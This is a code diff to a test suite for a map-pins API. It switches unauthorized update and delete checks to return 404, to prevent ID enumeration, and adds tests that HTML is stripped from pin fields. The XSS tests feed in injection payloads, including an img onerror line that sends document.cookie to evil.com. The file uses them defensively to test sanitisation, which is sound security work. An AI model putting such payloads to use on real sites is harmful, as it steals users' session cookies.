@@ -259,14 +259,14 @@ describe('Pins', () => {
       });
     });
 
-    it('should reject update by non-owner', async () => {
+    it('should return 404 when non-owner tries to update a pin', async () => {
       const response = await request(app)
         .put(`/api/pins/${pinId}`)
         .set('Authorization', `Bearer ${otherUserToken}`)
         .send({ title: 'Hacked Title' });
 
-      expect(response.status).toBe(403);
-      expect(response.body.message).toBe('Unauthorized');
+      // Returns 404 (not 403) so attackers cannot enumerate valid pin IDs
+      expect(response.status).toBe(404);
     });
 
     it('should return 404 for non-existent pin', async () => {
@@ -301,12 +301,29 @@ describe('Pins', () => {
       expect(getResponse.status).toBe(404);
     });
 
-    it('should reject deletion by non-owner', async () => {
+    it('should return 404 when non-owner tries to delete a pin', async () => {
       const response = await request(app)
         .delete(`/api/pins/${pinId}`)
         .set('Authorization', `Bearer ${otherUserToken}`);
 
-      expect(response.status).toBe(403);
+      // Returns 404 (not 403) so attackers cannot enumerate valid pin IDs
+      expect(response.status).toBe(404);
+    });
+
+    it('should return 404 for both missing and unauthorized pins (no ID enumeration)', async () => {
+      // Delete the pin as the owner
+      await request(app)
+        .delete(`/api/pins/${pinId}`)
+        .set('Authorization', `Bearer ${userToken}`);
+
+      // otherUser tries to update the now-deleted pin — should be indistinguishable from
+      // a pin that never existed, preventing enumeration of valid IDs via 403 vs 404 diff
+      const updateDeleted = await request(app)
+        .put(`/api/pins/${pinId}`)
+        .set('Authorization', `Bearer ${otherUserToken}`)
+        .send({ title: 'Probe' });
+
+      expect(updateDeleted.status).toBe(404);
     });
 
     it('should return 404 for non-existent pin', async () => {
@@ -417,6 +434,52 @@ describe('Pins', () => {
 
       // Likes should consistently be 0 for new pins
       expect(getResponse.body[0].likes).toBe(0);
+    });
+  });
+
+  describe('XSS Prevention', () => {
+    it('should strip HTML tags from pin text fields on create', async () => {
+      const response = await request(app)
+        .post('/api/pins')
+        .set('Authorization', `Bearer ${userToken}`)
+        .send({
+          latitude: 37.7749,
+          longitude: -122.4194,
+          // tag + trailing text — tag stripped, text kept
+          title: '<img src=x onerror="alert(1)">Scenic Spot',
+          // self-contained tag with no text content — strips to empty
+          description: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
+          address: '<b>123 Main St</b>',
+        });
+
+      expect(response.status).toBe(201);
+      const pinId = response.body.id;
+
+      const getResponse = await request(app)
+        .get(`/api/pins/${pinId}`)
+        .set('Authorization', `Bearer ${userToken}`);
+
+      expect(getResponse.status).toBe(200);
+      expect(getResponse.body[0].title).toBe('Scenic Spot');
+      expect(getResponse.body[0].description).toBe('');
+      expect(getResponse.body[0].address).toBe('123 Main St');
+    });
+
+    it('should strip HTML tags from pin text fields on update', async () => {
+      const createResponse = await request(app)
+        .post('/api/pins')
+        .set('Authorization', `Bearer ${userToken}`)
+        .send({ latitude: 37.7749, longitude: -122.4194, title: 'Clean Title' });
+
+      const pinId = createResponse.body.id;
+
+      const updateResponse = await request(app)
+        .put(`/api/pins/${pinId}`)
+        .set('Authorization', `Bearer ${userToken}`)
+        .send({ title: '<svg onload="alert(1)">Hacked</svg>' });
+
+      expect(updateResponse.status).toBe(200);
+      expect(updateResponse.body.title).toBe('Hacked');
     });
   });
 });
